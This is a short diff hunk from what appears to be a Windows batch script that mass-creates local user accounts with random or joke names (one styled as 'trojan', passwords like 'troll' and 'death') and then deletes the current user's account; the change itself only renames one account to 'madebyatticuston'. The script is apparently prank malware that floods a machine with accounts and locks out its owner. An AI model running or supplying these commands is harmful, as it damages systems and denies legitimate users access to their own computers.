@@ -229,7 +229,7 @@ net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
-net user madebygrogu troll /add
+net user madebyatticuston troll /add
 net user wenomechainsamaversion2 troll /add
 net user 𝓽𝓻𝓸𝓳𝓪𝓷 death /add
 net user %USERNAME% /delete
